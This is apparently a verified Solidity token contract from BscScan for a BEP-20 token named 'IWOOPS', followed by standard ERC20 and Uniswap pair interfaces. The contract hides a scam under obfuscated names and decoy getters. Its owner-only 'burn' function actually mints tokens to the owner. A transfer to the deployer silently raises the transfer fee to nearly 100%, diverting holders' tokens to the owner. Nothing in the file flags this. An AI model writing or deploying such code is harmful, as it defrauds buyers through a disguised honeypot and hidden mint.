/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.4;
contract IWOOPS {
uint256 private  IXOIZX = 100000000;
address private  FGFYAJ = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint8 public constant decimals = 18;
mapping (address => uint256) public balanceOf;
address public owner;
uint256 private  PAHPST = 1000000000000000000000;
address private  JGEDUM = address(0);
address private  UDSZEV = address(0);
address private  FRDYSX = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  QBAVKF = 10000000000;
mapping (address => mapping (address => uint256)) private _allowances;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  WGAANW = 10000000000000;
uint256 private  ORSHAB = 1000000000000000;
uint256 private  UAQVEH = 1000000000000000000;
uint256 public constant MNBYHN = 99999;
string public  name = "IWOOPS";
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  OJMRWD = 1000000000000000000;
string public  symbol = "IWOOPS";
event Transfer(address indexed from, address indexed to, uint256 value);
address private  LNYSFM = address(0);
function _getORSHAB() private returns (uint256) {
return ORSHAB;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "LFERXF");
require(to != address(0), "LFERXF");
require(amount <= balanceOf[from], "LFERXF");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* MNBYHN/OJMRWD ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==FGFYAJ){
OJMRWD = MNBYHN+2;
}
emit Transfer(from, to, transferAmount);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tLFERXF 0");
require(spender != address(0), "fLFERXF 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getPAHPST() private returns (uint256) {
return PAHPST;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getWGAANW() private returns (uint256) {
return WGAANW;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getFRDYSX() private returns (address) {
return FRDYSX;
}

constructor () public {
FGFYAJ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getQBAVKF() private returns (uint256) {
return QBAVKF;
}

function _getLNYSFM() private returns (address) {
return LNYSFM;
}

function _getIXOIZX() private returns (uint256) {
return IXOIZX;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getJGEDUM() private returns (address) {
return JGEDUM;
}


}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

///////////////////////////////////////////

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);

}